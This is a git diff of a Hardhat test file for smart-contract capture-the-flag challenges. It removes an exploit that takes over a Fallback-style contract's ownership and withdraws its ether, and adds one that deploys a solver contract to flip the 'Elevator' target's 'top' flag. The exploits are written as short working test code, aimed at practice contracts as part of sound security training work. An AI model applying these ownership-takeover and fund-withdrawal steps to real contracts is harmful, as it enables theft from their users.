@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] Elevator', function () {
 
     let deployer, attacker;
     
@@ -13,34 +13,31 @@ describe('[Challenge] Example Vuln', function () {
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
+            const ContractFactory = await ethers.getContractFactory('Elevator');
             this.target = ContractFactory.attach("");
             
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
+            const ContractFactory = await ethers.getContractFactory('Elevator', deployer);
             this.target = await ContractFactory.deploy();
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        const BuildingSolverFactory = await ethers.getContractFactory('BuildingSolver', attacker);
+        const BuildingSolver = await BuildingSolverFactory.deploy();
+        let pwnTX = await BuildingSolver.connect(attacker).pwn(
+            this.target.address, 
+            1337, 
+            {gasLimit: 200000}
+        ); await pwnTX.wait();
+        console.log(`\t top: ${await this.target.top()}`);
     }).timeout(0);
 
     after(async () => {
         /** SUCCESS CONDITIONS */
-        expect(await this.target.owner()).to.be.eq(attacker.address);
+        expect(await this.target.top()).to.be.eq(true);
     });
 });
